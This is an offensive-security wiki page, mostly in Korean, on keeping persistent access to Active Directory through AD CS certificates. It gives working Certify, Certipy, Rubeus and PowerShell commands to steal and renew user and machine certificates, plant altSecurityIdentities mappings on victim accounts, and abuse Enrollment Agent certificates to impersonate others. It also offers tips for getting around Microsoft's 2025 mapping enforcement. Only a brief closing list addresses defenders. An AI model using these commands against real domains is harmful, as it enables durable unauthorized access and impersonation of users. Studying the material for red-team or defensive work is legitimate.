# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**이것은 [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)에서 나온 훌륭한 연구의 account persistence 장에 대한 간단한 요약입니다**

## Certificates를 이용한 Active User Credential Theft 이해하기 – PERSIST1

domain authentication을 허용하는 certificate를 사용자가 요청할 수 있는 상황에서는, 공격자가 이 certificate를 요청해 탈취함으로써 network에서 persistence를 유지할 기회를 얻게 됩니다. 기본적으로 Active Directory의 `User` template는 이러한 요청을 허용하지만, 때로는 비활성화되어 있을 수 있습니다.

[Certify](https://github.com/GhostPack/Certify) 또는 [Certipy](https://github.com/ly4k/Certipy)를 사용하면 client authentication을 허용하는 활성화된 template를 검색한 다음 하나를 요청할 수 있습니다:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
인증서의 힘은 비밀번호가 변경되더라도, 인증서가 유효한 한 그 인증서가 속한 사용자로 인증할 수 있다는 점에 있습니다.

PEM을 PFX로 변환하고 이를 사용해 TGT를 얻을 수 있습니다:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Note: 다른 techniques와 함께 사용하면 (THEFT 섹션 참조), certificate-based auth는 LSASS를 건드리지 않고도, 심지어 non-elevated contexts에서도 지속적인 access를 허용합니다.

## Certificates를 이용한 Machine Persistence 획득 - PERSIST2

공격자가 호스트에서 elevated privileges를 가지고 있다면, 기본 `Machine` template를 사용해 compromised system의 machine account를 certificate로 enroll할 수 있습니다. machine으로 authenticate하면 local services에 대해 S4U2Self가 가능해지고, durable host persistence를 제공할 수 있습니다:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## 인증서 갱신을 통한 Persistence 확장 - PERSIST3

certificate templates의 유효 기간과 갱신 기간을 악용하면 공격자가 장기적인 접근 권한을 유지할 수 있다. 이전에 발급된 certificate와 그 private key를 보유하고 있다면, 만료되기 전에 이를 갱신하여 원래 principal에 연결된 추가 request artifact를 남기지 않고도 새롭고 장기 지속되는 credential을 얻을 수 있다.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operational tip: 공격자가 보유한 PFX 파일의 수명을 추적하고 만료 전에 갱신하세요. 갱신은 또한 업데이트된 인증서가 최신 SID mapping extension을 포함하도록 만들어, 더 엄격한 DC mapping 규칙 아래에서도 계속 사용할 수 있게 할 수 있습니다(다음 섹션 참조).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

대상 계정의 `altSecurityIdentities` 속성에 쓸 수 있다면, 공격자가 제어하는 certificate를 해당 계정에 명시적으로 mapping할 수 있습니다. 이는 password changes 이후에도 유지되며, strong mapping formats를 사용할 경우 최신 DC enforcement 아래에서도 기능을 유지합니다.

고수준 흐름:

1. 자신이 제어하는 client-auth certificate를 얻거나 발급합니다(예: `User` template를 자신으로 enroll).
2. cert에서 strong identifier를 추출합니다(Issuer+Serial, SKI, 또는 SHA1-PublicKey).
3. 해당 identifier를 사용하여 피해자 principal의 `altSecurityIdentities`에 explicit mapping을 추가합니다.
4. 자신의 certificate로 authenticate하면, DC가 explicit mapping을 통해 이를 피해자에 매핑합니다.

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
그 다음 PFX로 authenticate합니다. Certipy는 TGT를 직접 얻습니다:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### 강력한 `altSecurityIdentities` 매핑 만들기

실제로 **Issuer+Serial** 및 **SKI** 매핑은 공격자가 보유한 certificate에서 만들기 가장 쉬운 strong format입니다. 이는 **2025년 2월 11일** 이후 중요해지는데, 이때 DC는 기본적으로 **Full Enforcement**로 설정되며 weak mapping은 더 이상 신뢰할 수 없게 됩니다.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- `X509IssuerSerialNumber`, `X509SKI`, 또는 `X509SHA1PublicKey`만 사용하는 strong mapping types를 사용하세요. Weak formats(Subject/Issuer, Subject-only, RFC822 email)는 deprecated 되었고 DC policy에 의해 차단될 수 있습니다.
- 이 mapping은 **user**와 **computer** 객체 모두에서 동작하므로, computer account의 `altSecurityIdentities`에 write access만 있어도 해당 machine으로 persistence 할 수 있습니다.
- cert chain은 DC가 신뢰하는 root까지 build되어야 합니다. NTAuth의 Enterprise CAs는 일반적으로 trusted이며, 일부 환경에서는 public CAs도 trust합니다.
- Schannel authentication은 DC에 Smart Card Logon EKU가 없거나 `KDC_ERR_PADATA_TYPE_NOSUPP`를 반환해 PKINIT가 실패하더라도 persistence에 여전히 유용합니다.

#### 2025+ `Issuer/SID` explicit mappings

**Windows Server 2022+** domain controllers에 **2025년 9월 9일** security update가 적용된 경우, Microsoft는 persistence에 유리한 또 다른 strong explicit mapping format을 추가했습니다. 이 형식은 동일한 CA에서 certificate가 reissuance되어도 유지되기 때문입니다:
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
운영상으로 이것은 오래된 강한 형식과 다릅니다:
- `Issuer+Serial`은 **하나의 정확한 인증서**를 고정합니다.
- `SKI` / `SHA1-PUKEY`는 **하나의 키페어**를 고정합니다.
- `Issuer/SID`는 **발급 CA + 대상 SID**를 고정하므로, 같은 CA에서 갱신되거나 재발급된 인증서도 `altSecurityIdentities`를 다시 쓰지 않아도 계속 동작합니다.

요구사항 및 주의사항
- 로그인에 제시된 인증서는 SID security extension 안에 대상 계정 SID를 실제로 포함해야 합니다.
- 이 형식은 SID extension을 생략하는 `ESC9` / `ESC16` 스타일 인증서에는 유용하지 않습니다. 그런 경우 `Issuer+Serial`, `SKI`, 또는 `SHA1-PUKEY`로 돌아가십시오.

약한 explicit mappings와 공격 경로에 대한 더 자세한 내용은 다음을 참조하십시오:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

유효한 Certificate Request Agent/Enrollment Agent 인증서를 얻으면, 사용자 대신 언제든지 새로운 로그온 가능 인증서를 발급할 수 있으며 agent PFX를 오프라인으로 보관해 persistence token으로 사용할 수 있습니다. 악용 workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
에이전트 인증서 또는 템플릿 권한을 취소해야 이 persistence를 제거할 수 있다.

Operational notes
- 최신 `Certipy` 버전은 `-on-behalf-of`와 `-renew`를 모두 지원하므로, Enrollment Agent PFX를 가진 공격자는 원래 대상 계정을 다시 건드리지 않고도 leaf certificates를 발급하고 나중에 갱신할 수 있다.
- PKINIT 기반 TGT retrieval이 불가능하더라도, 생성된 on-behalf-of certificate는 `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`로 Schannel authentication에 여전히 사용할 수 있다.

## Using Persisted Certificates When PKINIT Fails

DC에 Smart Card Logon 기능이 있는 certificate가 없으면, PKINIT를 통한 certificate logon은 `KDC_ERR_PADATA_TYPE_NOSUPP`로 실패할 수 있다. 그렇다고 해서 이 persistence primitive가 사라지는 것은 아니다: 같은 PFX는 종종 Schannel-authenticated LDAP access에도 계속 사용할 수 있다.
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
This is especially useful after PERSIST4/PERSIST5 because you can keep operating from Linux/macOS and chain other directory persistence actions such as dropping [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) or editing writable delegation attributes.

## 2025 Strong Certificate Mapping Enforcement: Persistence에 미치는 영향

Microsoft KB5014754는 도메인 컨트롤러에 Strong Certificate Mapping Enforcement를 도입했습니다. **2025년 2월 11일**부터 DC는 약하거나 모호한 매핑에 대해 기본값으로 **Full Enforcement**를 사용하며, **2025년 9월 9일** 보안 업데이트가 적용된 DC는 더 이상 이전 Compatibility-mode fallback을 지원하지 않습니다. 실질적 의미는 다음과 같습니다:

- SID mapping extension이 없는 2022 이전 certificate는 DC가 Full Enforcement 상태일 때 implicit mapping이 실패할 수 있습니다. 공격자는 AD CS를 통해 certificate를 갱신해(SID extension을 얻거나) `altSecurityIdentities`에 강한 explicit mapping을 심어(PERSIST4) 접근을 유지할 수 있습니다.
- 강한 형식(`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, 그리고 최신 DC의 경우 `Issuer/SID`)을 사용하는 explicit mappings는 계속 동작합니다. 약한 형식(Issuer/Subject, Subject-only, RFC822)은 차단될 수 있으며 persistence 용도로는 피해야 합니다.
- 약한 mappings가 여전히 동작하는 것처럼 보인다면, 안정적인 장기 persistence 경로라기보다 패치되지 않았거나 다른 설정의 DC를 만났다고 가정해야 합니다.
- SID extension을 억제하는 `ESC9` / `ESC16` 스타일 issuance path에서는 `Issuer/SID`를 사용할 수 없으므로, 대안으로 강한 mappings를 쓰거나 일반 template을 통해 갱신하는 것이 실질적인 persistence 옵션입니다.

관리자는 다음 항목을 모니터링하고 경고를 설정해야 합니다:
- `altSecurityIdentities` 변경과 Enrollment Agent 및 User certificates의 issuance/renewals.
- on-behalf-of 요청과 비정상적인 renewal 패턴에 대한 CA issuance logs.

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
